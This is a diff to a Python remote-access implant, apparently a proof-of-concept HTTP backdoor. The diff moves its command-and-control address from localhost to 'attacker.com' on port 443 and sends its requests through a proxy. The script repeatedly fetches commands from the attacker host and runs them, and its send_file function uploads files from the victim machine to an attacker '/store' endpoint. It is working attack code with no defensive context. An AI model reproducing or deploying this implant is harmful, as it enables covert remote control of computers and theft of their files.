@@ -5,14 +5,16 @@ import subprocess
 import time
 import os
 
-ATTACKER_IP = '127.0.0.1' # change this to the attacker's IP address
-ATTACKER_PORT = 8080
+ATTACKER_HOSTNAME = 'attacker.com' # change this to the attacker's IP address
+ATTACKER_PORT = 443
+proxy = "proxy.example.com:8080"
 
 # Data is a dict
-def send_post(data, url=f'http://{ATTACKER_IP}:{ATTACKER_PORT}'):
+def send_post(data, url=f'http://{ATTACKER_HOSTNAME}:{ATTACKER_PORT}'):
     data = {"rfile": data}
     data = parse.urlencode(data).encode()
     req = request.Request(url, data=data)
+    req.set_proxy(proxy, 'http')
     request.urlopen(req) # send request
 
 
@@ -27,7 +29,7 @@ def send_file(command):
         send_post("[-] Not able to find the file")
         return
 
-    store_url = f'http://{ATTACKER_IP}:{ATTACKER_PORT}/store' # Posts to /store
+    store_url = f'http://{ATTACKER_HOSTNAME}:{ATTACKER_PORT}/store' # Posts to /store
     with open(path, 'rb') as fp:
         send_post(fp.read(), url=store_url)
 
@@ -39,8 +41,11 @@ def run_command(command):
 
 
 while True:
-    command = request.urlopen(f"http://{ATTACKER_IP}:{ATTACKER_PORT}").read().decode()
+    req2 = request.Request(f"http://{ATTACKER_HOSTNAME}:{ATTACKER_PORT}")
+    req2.set_proxy(proxy, 'http')
 
+    command = request.urlopen(req2).read().decode()
+    
     if 'terminate' in command:
         break
 
